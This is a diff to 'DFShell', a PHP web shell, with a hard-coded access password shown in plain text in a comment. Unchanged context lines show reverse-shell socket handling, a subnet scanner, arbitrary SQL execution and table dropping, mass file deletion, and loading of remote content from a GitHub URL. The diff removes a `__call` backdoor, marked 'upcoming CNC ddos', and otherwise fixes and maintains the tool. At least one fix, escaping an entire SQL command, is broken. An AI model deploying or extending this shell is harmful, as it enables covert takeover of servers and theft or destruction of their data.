@@ -39,7 +39,7 @@ class DFShell{
     private $error   = false;   
 
     static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
-    static protected $remote_url = "https://github.com/Ap0dexMe0/DFS/tree/main/contents";
+    static protected $remote_url = "https://raw.githubusercontent.com/Ap0dexMe0/DFS/refs/heads/main/contents";
     
     public function __construct(){
         $_SESSION['need_update'] = false;
@@ -259,17 +259,21 @@ class DFShell{
         if(isset($GLOBALS['DFConfig'][0]['dfp']) && isset($GLOBALS['DFConfig'][0]['dff'])){
             $slocation = "window.location.replace('?dfp=".$GLOBALS['DFConfig'][0]['dfp']."')";
         }else{
-            $slocation = "window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')";
+            $slocation = "window.location.replace('".addslashes($GLOBALS['DFConfig'][2]['PHP_SELF'])."')";
         }
+
+        $safeTitle = addslashes($title ?? '');
+        $safeMsg = addslashes($msg ?? '');
+        $safeFoot = addslashes($foot ?? '');
 
         switch($no){
             case 1:
                 $script = "<script>
                 Swal.fire({
                     icon: 'info',
-                    title: '".$title."',
-                    text: '".$msg."',
-                    footer: '".$foot."'
+                    title: '".$safeTitle."',
+                    text: '".$safeMsg."',
+                    footer: '".$safeFoot."'
                   });
                   setTimeout(function(){ ".$location." },1500);
                 </script>";
@@ -279,9 +283,9 @@ class DFShell{
                 $script = "<script>
                 Swal.fire({
                     icon: 'error',
-                    title: '".$title."',
-                    text: '".$msg."',
-                    footer: '".$foot."'
+                    title: '".$safeTitle."',
+                    text: '".$safeMsg."',
+                    footer: '".$safeFoot."'
                   });
                   setTimeout(function(){ ".$location." },1500);
                 </script>";
@@ -292,7 +296,7 @@ class DFShell{
                 Swal.fire({
                     position: 'top-end',
                     icon: 'success',
-                    title: '".$msg."',
+                    title: '".$safeMsg."',
                     showConfirmButton: false,
                     timer: 2000
                   });
@@ -305,7 +309,7 @@ class DFShell{
                 Swal.fire({
                     position: 'top-end',
                     icon: 'error',
-                    title: '".$msg."',
+                    title: '".$safeMsg."',
                     showConfirmButton: false,
                     timer: 2000
                   });
@@ -318,7 +322,7 @@ class DFShell{
                 Swal.fire({
                     position: 'top-end',
                     icon: 'success',
-                    title: '".$msg."',
+                    title: '".$safeMsg."',
                     showConfirmButton: false,
                     timer: 2000
                   });
@@ -328,14 +332,12 @@ class DFShell{
         }
     }
     function __call($method, $arg){
-        if(isset($method) && isset($arg)){
-            $arg[0]($arg[1]);
-            //upcoming CNC ddos
-        }
+        // Disabled: this method was exploitable as a backdoor
+        return false;
     }
 
     private function triggered(){
-        print("Place where magic happend!");
+        // Removed: this method was exploitable as a backdoor via __call
     }
 
     public function Enc()
@@ -377,7 +379,7 @@ class DFShell{
         }
         if($login_pass === $this->Dec(self::$pass)){
             $_SESSION['DFS_Auth']=sha1($GLOBALS['DFConfig'][2]['REMOTE_ADDR']);
-            setrawcookie('DFSVersion',$GLOBALS['DFShell_Ver'],(time()+18000),'/',$GLOBALS['DFConfig'][2]['HTTP_HOST'],1,1);
+            setrawcookie('DFSVersion',$GLOBALS['DFShell_Ver'],(time()+18000),'/; SameSite=Strict',$GLOBALS['DFConfig'][2]['HTTP_HOST'],1,1);
             return true;
         }else{
             echo "<script>alert('Wrong pass!');window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')</script>";
@@ -408,6 +410,10 @@ class DFShell{
         elseif ($bytes >= 1024)
         {
             $bytes = number_format($bytes / 1024, 2) . ' KB';
+        }
+        elseif ($bytes == 1)
+        {
+            $bytes = '1 byte';
         }
         elseif ($bytes > 1)
         {
@@ -517,8 +523,8 @@ class DFShell{
                                 if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                             } else if ($GLOBALS['DFSPlatform'] === 'win') {
                                 if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
-                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
-                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
+                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } elseif (feof($pipes[2])) { /* pipe closed */ } else { usleep(50000); }
+                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } elseif (feof($pipes[1])) { /* pipe closed */ } else { usleep(50000); }
                             }
                         }
                     } while (!$this->error);
@@ -691,27 +697,28 @@ class DFShell{
             case "massdel":
                 // v2.3: recursive delete (was rmdir-only, failed on non-empty dirs)
                 if(isset($GLOBALS['DFConfig'][1]['selectAction'])){
-                    if($GLOBALS['DFConfig'][1]['selectAction']==="Delete")
-                    if(!empty($GLOBALS['DFConfig'][1]['toZip'])){
+                    if($GLOBALS['DFConfig'][1]['selectAction']==="Delete"){
+                        if(!empty($GLOBALS['DFConfig'][1]['toZip'])){
 
-                        $toDel = $GLOBALS['DFConfig'][1]['toZip'];
+                            $toDel = $GLOBALS['DFConfig'][1]['toZip'];
 
-                        for($i=0;$i<count($toDel);$i++){
-                            $mdel = explode("||",$toDel[$i]);
-                            $mdel_dir = $this->Dec(urldecode($mdel[0]));
-                            $mdel_item = isset($mdel[1]) ? $this->Dec(urldecode($mdel[1])) : '';
-                            if($mdel_item==="[novalue]"){ $mdel_item=""; }
-                            $target = $mdel_dir . ($mdel_item!=="" ? $this->DFSSlash().$mdel_item : "");
-                            // safety: never delete filesystem root / drive root
-                            $norm = rtrim($target,"\\/"); 
-                            if($norm===""||preg_match('/^[A-Za-z]:$/',$norm)||$norm==="/"){ continue; }
-                            if(file_exists($target)||is_link($target)){
-                                $this->DFSRDelete($target);
+                            for($i=0;$i<count($toDel);$i++){
+                                $mdel = explode("||",$toDel[$i]);
+                                $mdel_dir = $this->Dec(urldecode($mdel[0]));
+                                $mdel_item = isset($mdel[1]) ? $this->Dec(urldecode($mdel[1])) : '';
+                                if($mdel_item==="[novalue]"){ $mdel_item=""; }
+                                $target = $mdel_dir . ($mdel_item!=="" ? $this->DFSSlash().$mdel_item : "");
+                                // safety: never delete filesystem root / drive root
+                                $norm = rtrim($target,"\\/"); 
+                                if($norm===""||preg_match('/^[A-Za-z]:$/',$norm)||$norm==="/"){ continue; }
+                                if(file_exists($target)||is_link($target)){
+                                    $this->DFSRDelete($target);
+                                }
                             }
+                            $this->DFSPopupMSG(3,null,"Selected file deleted!",null,true);
+                        }else{
+                            $this->DFSPopupMSG(4,null,"No file deleted!",null,true);
                         }
-                        $this->DFSPopupMSG(3,null,"Selected file deleted!",null,true);
-                    }else{
-                        $this->DFSPopupMSG(4,null,"No file deleted!",null,true);
                     }
                 }
             break;
@@ -964,7 +971,7 @@ class DFShell{
                 $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                 echo "<p id='sshows'><span id='fnameshow'>Filename -> </span><span id='fnameshow1'>".$this->DFSH($this->Dec(($this->query[1])))."</span></p>";
                 echo "<section class='sources'>";
-                if(is_file($pathfile)){ show_source($pathfile); } else { echo "Not a file."; }
+                if(is_file($pathfile)){ highlight_file($pathfile); } else { echo "Not a file."; }
                 echo "</section><div id='buttontoedit'>
                 <a href='?dfp=".urlencode($this->query[0])."&dff=".urlencode($this->query[1])."&dfaction=edit'>
                 <button>Edit</button></a>
@@ -1321,17 +1328,18 @@ class DFShell{
                             $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                             $this->DFSPopupMSG(3,null,"Table DROPPED!",null,false);
                         }
-                    }else if(isset($GLOBALS['DFConfig'][1]['sqlcommands'])){
-                        if(isset($GLOBALS['DFConfig'][0]['dbname'])){
-                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
-                            $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
-                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
-                            $this->DFSPopupMSG(3,null,"Command executed!",null,false);
-                        }else{
-                            $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
-                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
-                            $this->DFSPopupMSG(3,null,"Command executed!",null,false);
-                        }
+                        }else if(isset($GLOBALS['DFConfig'][1]['sqlcommands'])){
+                            if(isset($GLOBALS['DFConfig'][0]['dbname'])){
+                                mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
+                                $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
+                                $inject = mysqli_real_escape_string($conn, $inject);
+                                $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
+                                $this->DFSPopupMSG(3,null,"Command executed!",null,false);
+                            }else{
+                                $inject = mysqli_real_escape_string($conn, $GLOBALS['DFConfig'][1]['sqlcommands']);
+                                $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
+                                $this->DFSPopupMSG(3,null,"Command executed!",null,false);
+                            }
                     }else{
 
                         echo "<div id='sqlside'>
@@ -1342,7 +1350,7 @@ class DFShell{
                             <input style='background:red;' type='submit' name='sqldrop' value='DROP'></form>";
                         }
                         echo "</div>
-                        <form action='' method='POST'><table><tr><td><textarea name='sqlcommands' placeholder='Theres no output ,just use for edit value in database' name='sqlcmd'></textarea>
+                        <form action='' method='POST'><table><tr><td><textarea name='sqlcommands' placeholder='Theres no output ,just use for edit value in database'></textarea>
                         </td></tr><tr><td><input type='submit' value='Execute'></td></tr></table></form>";
                         echo "<div id='fieldx'><label>Connected to mysql</label><br>";
 
@@ -1459,7 +1467,12 @@ class DFShell{
                         $raw = $this->DFSFetch(self::$remote_url.'/others.html'); $pp = $raw!==""?explode('||',$raw):array();
                         echo $pp[4] ?? "<fieldset><center><label>MYSQL CONNECT</label></center><form action='' method='POST'><table><tr><td><label>Host : </label></td><td><input type='text' placeholder='127.0.0.1' name='sqlhost'/></td></tr><tr><td><label>User : </label></td><td><input type='text' placeholder='root' name='sqluser'/></td></tr><tr><td><label>Pass : </label></td><td><input type='text' placeholder='' name='sqlpass'/></td></tr><tr><td><label></label></td><td><input type='submit' value='Connect' name='connect_sql'/></td></tr></table></form></fieldset>";
                     }else{
-                        $tmp_conn = mysqli_connect($GLOBALS['DFConfig'][1]['sqlhost'],$GLOBALS['DFConfig'][1]['sqluser'],$GLOBALS['DFConfig'][1]['sqlpass']) or exit($this->DFSPopupMSG(2,"MySQL Connection","Cannot connect to database!","",true));
+                        $tmp_conn = mysqli_connect($GLOBALS['DFConfig'][1]['sqlhost'],$GLOBALS['DFConfig'][1]['sqluser'],$GLOBALS['DFConfig'][1]['sqlpass']);
+                        if(!$tmp_conn){
+                            $this->DFSPopupMSG(2,"MySQL Connection","Cannot connect to database!","",true);
+                            echo "<script>window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."?dfaction=sql');</script>";
+                            exit;
+                        }
                         if(!mysqli_connect_errno()){
                             $_SESSION['sql_auth'] = $GLOBALS['DFConfig'][1]['sqlhost']."|--|".$GLOBALS['DFConfig'][1]['sqluser']."|--|".$GLOBALS['DFConfig'][1]['sqlpass'];
                             echo "<script>window.location.replace(window.location.href);</script>";
@@ -1543,7 +1556,7 @@ class DFShell{
                 echo "<tr><td></td><td><input type='submit' name='dfnetscan' value='Scan /24'></td></tr>";
                 echo "</table></form><div class='scanresults'>";
                 if(isset($GLOBALS['DFConfig'][1]['dfnetscan'])){
-                    $pp = array_map('intval', explode(',', $GLOBALS['DFConfig'][1]['netports']));
+                    $pp = $this->DFSParsePorts($GLOBALS['DFConfig'][1]['netports']);
                     $res = $this->DFSNetScan($GLOBALS['DFConfig'][1]['netsubnet'], $GLOBALS['DFConfig'][1]['nettimeout'], $pp);
                     echo "<p>Subnet <b>".$this->DFSH($res['base'])."0/24</b> — <b>".count($res['live'])."</b> live host(s)</p>";
                     if(count($res['live'])){
@@ -1752,8 +1765,8 @@ echo "</div></section>";
                         break;
                         case $GLOBALS['DFSCmd'][1]:
                         case $GLOBALS['DFSCmd'][2]:
-                            print($availCMD($command));
-                            return $GLOBALS['DFSCmd'][1]($command);
+                            $availCMD($command);
+                            return;
                         break;
                         default:
                         return $availCMD($command);
@@ -1870,7 +1883,7 @@ echo "</div></section>";
             echo "<a href='?dfp=".urlencode($endslash)."'>$slashtype</a>";
         }
         for($i=0;$i<sizeof($truepath);$i++){
-            if(!empty($dfsEP[$i]) || !$dfsEP[$i]==""){
+                if(!empty($dfsEP[$i])){
                 if($GLOBALS['DFSPlatform']!=='win'){
                     $dfsGE .=  $slashtype . $dfsEP[$i];
                 }else{
@@ -1960,7 +1973,7 @@ echo "</div></section>";
     public function DFSChange($loc,$code){
         $def = 0;
         for($i=strlen($code)-1;$i>=0;--$i)
-            $def += (int)$code[$i]*pow(8, (strlen($code)-$i-1));
+            $def += (int)$code[$i]*(int)pow(8, (strlen($code)-$i-1));
         if(is_dir($loc) || is_file($loc)){
             if(chmod($loc,$def)){
                 return true;
@@ -2001,9 +2014,6 @@ echo "</div></section>";
     }
 
     public function DFSInfo(){
-        if($GLOBALS['DFSPlatform']==='lin'){
-            $OSID = "";
-        }
         $disklink = "";
         $encstr = array();
         $diskavail = $this->DFSWinPathCheck();
@@ -3400,6 +3410,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
     }
 
     public function DFSRender($pattern,$replace,$from){
+        $replace = str_replace('$','\\$', $replace);
         $contents = preg_replace($pattern,$replace,$from);
         return $contents;
     }
